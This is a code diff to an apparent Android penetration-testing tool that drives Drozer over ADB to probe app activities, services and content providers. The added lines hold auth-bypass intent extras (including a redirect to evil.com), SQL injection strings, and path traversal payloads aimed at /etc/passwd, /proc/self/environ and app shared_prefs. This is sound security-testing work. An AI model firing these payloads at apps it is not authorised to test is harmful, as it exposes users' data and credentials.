@@ -11,26 +11,24 @@ from __future__ import annotations
 from rich.console import Console
 from rich.prompt import Confirm
 from rich.table import Table
+from rich.panel import Panel
 
-from core.config import Config, FALSE_POSITIVE_PREFIXES
+from core.config import Config
 from core.adb import ADB
 from core.drozer import Drozer
 from core.screenshot import ScreenshotManager
+from utils.helpers import is_library_component
 
 console = Console()
 PHASE = "Phase I — Drozer Component Testing"
-
-
-def _is_library_component(name: str) -> bool:
-    return any(name.startswith(prefix) for prefix in FALSE_POSITIVE_PREFIXES)
 
 
 def _filter_components(components: list[str], include_library: bool) -> tuple[list[str], list[str]]:
     """Split components into (to_test, skipped). If include_library=True, test all."""
     if include_library:
         return components, []
-    to_test = [c for c in components if not _is_library_component(c)]
-    skipped = [c for c in components if _is_library_component(c)]
+    to_test = [c for c in components if not is_library_component(c)]
+    skipped = [c for c in components if is_library_component(c)]
     return to_test, skipped
 
 
@@ -73,7 +71,7 @@ def _ensure_drozer_connected(config: Config, adb: ADB, drozer: Drozer) -> bool:
     for attempt in range(1, MAX_DROZER_RETRIES + 1):
         console.print(f"\n[red bold]Drozer connection failed (attempt {attempt}/{MAX_DROZER_RETRIES}).[/red bold]")
         console.print("[cyan]Launching Drozer Agent on the device...[/cyan]")
-        adb.shell(f"am start -n {DROZER_AGENT_ACTIVITY}")
+        adb.shell(f"monkey -p {DROZER_AGENT_PKG} -c android.intent.category.LAUNCHER 1")
         time.sleep(2)
 
         console.print(Panel(
@@ -207,6 +205,12 @@ def _test_activities(
         for extra_label, extras in [
             ("is_admin=true", '--extra boolean is_admin "true"'),
             ("bypass_auth=true", '--extra boolean bypass_auth "true"'),
+            ("logged_in=true", '--extra boolean logged_in "true"'),
+            ("is_root=true", '--extra boolean is_root "true"'),
+            ("role=admin", '--extra string role "admin"'),
+            ("user_id=1", '--extra integer user_id 1'),
+            ("token=test", '--extra string token "test_token"'),
+            ("redirect_uri=evil", '--extra string redirect_uri "https://evil.com"'),
         ]:
             adb.force_stop(pkg)
             result = drozer.start_activity(pkg, act, extras)
@@ -222,20 +226,11 @@ def _test_activities(
 
 
 def _verify_service_running(adb: ADB, pkg: str, svc: str) -> tuple[bool, str]:
-    """
-    Check if a service is actively running via dumpsys.
-    Looks for the service inside '* ServiceRecord{...}' active entries,
-    not just anywhere in the dumpsys output.
-    """
+    from core.config import TIMING
     import time
-    time.sleep(1.5)
-    result = adb.shell(f"dumpsys activity services {pkg}")
-    output = result.stdout
+    
     svc_short = svc.split(".")[-1]
-
-    # Parse ServiceRecord blocks and verify activity within the matched block only.
     running = False
-    current_block: list[str] = []
     matched_block: list[str] = []
 
     def finalize_block(block: list[str]) -> tuple[bool, list[str]]:
@@ -247,24 +242,34 @@ def _verify_service_running(adb: ADB, pkg: str, svc: str) -> tuple[bool, str]:
         is_running = "app=ProcessRecord{" in block_text and "app=null" not in block_text
         return is_running, block
 
-    for line in output.splitlines():
-        if "* ServiceRecord{" in line:
-            block_running, block_lines = finalize_block(current_block)
-            if block_running:
-                running = True
-                matched_block = block_lines
-            current_block = [line]
-            continue
-        if current_block:
-            current_block.append(line)
+    for _ in range(TIMING.polling_retries):
+        time.sleep(1.0)
+        result = adb.shell(f"dumpsys activity services {pkg}")
+        
+        current_block: list[str] = []
+        running = False
+        matched_block = []
+        
+        for line in result.stdout.splitlines():
+            if "* ServiceRecord{" in line:
+                block_running, block_lines = finalize_block(current_block)
+                if block_running:
+                    running = True
+                    matched_block = block_lines
+                current_block = [line]
+                continue
+            if current_block:
+                current_block.append(line)
+                
+        block_running, block_lines = finalize_block(current_block)
+        if block_running:
+            running = True
+            matched_block = block_lines
+            
+        if running:
+            break
 
-    # finalize trailing block
-    block_running, block_lines = finalize_block(current_block)
-    if block_running:
-        running = True
-        matched_block = block_lines
-
-    evidence = "\n".join(matched_block[:40]) if matched_block else output[:2000]
+    evidence = "\n".join(matched_block[:40]) if matched_block else result.stdout[:2000]
     return running, evidence
 
 
@@ -495,21 +500,43 @@ def _test_providers(config: Config, drozer: Drozer, ss: ScreenshotManager, pkg: 
                 f"SQL injection via projection on {uri}:\n{sqli_result.stdout[:2000]}",
             )
 
-        traversal_uri = f"{uri}/../../../etc/passwd"
-        traversal_result = drozer.read_provider(traversal_uri)
-        config.log_command(
-            PHASE,
-            f"run app.provider.read {traversal_uri}",
-            traversal_result.stdout,
-            traversal_result.stderr,
-        )
-        if traversal_result.success and "root:" in traversal_result.stdout:
-            config.add_finding(
+        # Additional SQL injection payloads
+        for payload_label, payload in [
+            ("selection-or-1=1", "1 OR 1=1--"),
+            ("projection-quote", "' OR ''='"),
+        ]:
+            sqli2 = drozer.query_provider_injection(uri, payload)
+            config.log_command(PHASE, f'sqli test ({payload_label}) on {uri}', sqli2.stdout, sqli2.stderr)
+            if sqli2.success and sqli2.stdout and "error" not in sqli2.stdout.lower():
+                config.add_finding(
+                    PHASE,
+                    f"SQL Injection ({payload_label}) in content provider: {uri}",
+                    "Critical",
+                    f"SQL injection via '{payload_label}' on {uri}:\n{sqli2.stdout[:2000]}",
+                )
+
+        # Path traversal tests — multiple targets
+        traversal_targets = [
+            ("../../../etc/passwd", "root:"),
+            ("/../proc/self/environ", "PATH="),
+            (f"/../../../data/data/{pkg}/shared_prefs/", "xml"),
+        ]
+        for traversal_path, indicator in traversal_targets:
+            traversal_uri = f"{uri}/{traversal_path}"
+            traversal_result = drozer.read_provider(traversal_uri)
+            config.log_command(
                 PHASE,
-                f"Path traversal in content provider: {uri}",
-                "Critical",
-                f"Path traversal allowed reading /etc/passwd:\n{traversal_result.stdout[:2000]}",
+                f"run app.provider.read {traversal_uri}",
+                traversal_result.stdout,
+                traversal_result.stderr,
             )
+            if traversal_result.success and indicator in traversal_result.stdout:
+                config.add_finding(
+                    PHASE,
+                    f"Path traversal in content provider: {uri}",
+                    "Critical",
+                    f"Path traversal via {traversal_path} allowed reading sensitive data:\n{traversal_result.stdout[:2000]}",
+                )
 
     console.print("  [cyan]Running injection scanner...[/cyan]")
     inj_result = drozer.scan_provider_injection(pkg)
@@ -532,6 +559,13 @@ def _test_providers(config: Config, drozer: Drozer, ss: ScreenshotManager, pkg: 
             "High",
             trav_result.stdout[:2000],
         )
+
+    # URI discovery scan
+    console.print("  [cyan]Running URI discovery scanner...[/cyan]")
+    finduri_result = drozer.run_module("scanner.provider.finduri", f"-a {pkg}")
+    config.log_command(PHASE, f"run scanner.provider.finduri -a {pkg}", finduri_result.stdout, finduri_result.stderr)
+    if finduri_result.stdout:
+        config.log_command(PHASE, "Discovered URIs", finduri_result.stdout[:3000])
 
     screenshot_path = ss.capture("drozer_providers", "content_provider_tests")
     if screenshot_path:
